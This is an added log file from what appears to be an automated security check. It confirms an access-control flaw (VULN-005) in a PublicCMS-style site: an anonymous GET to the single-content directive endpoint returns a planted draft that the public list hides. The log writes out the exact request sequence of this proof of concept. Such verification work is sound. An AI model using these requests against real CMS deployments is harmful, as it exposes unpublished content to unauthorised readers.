@@ -1,0 +1,8 @@
+[INFO] VULN-005: unauth single-entity directive leaks non-public (draft) content
+[SETUP] admin login on Host site2.dev.publiccms.com
+[SETUP] planting draft content title=DRAFT_SECRET_akn8xss6 (categoryId=14 modelId=article draft=true)
+[SETUP] draft content id=7507277370991054848 (status=0, planted this run)
+[STEP] anonymous GET /api/directive/cms/content?id=7507277370991054848
+[STEP] anonymous GET /api/directive/cms/contentList (public-only)
+[INFO] draft leaked by single-entity directive: 1 ; present in public list: 0
+[OK] exploit confirmed — anonymous caller read a DRAFT (status=0) that the list directive hides
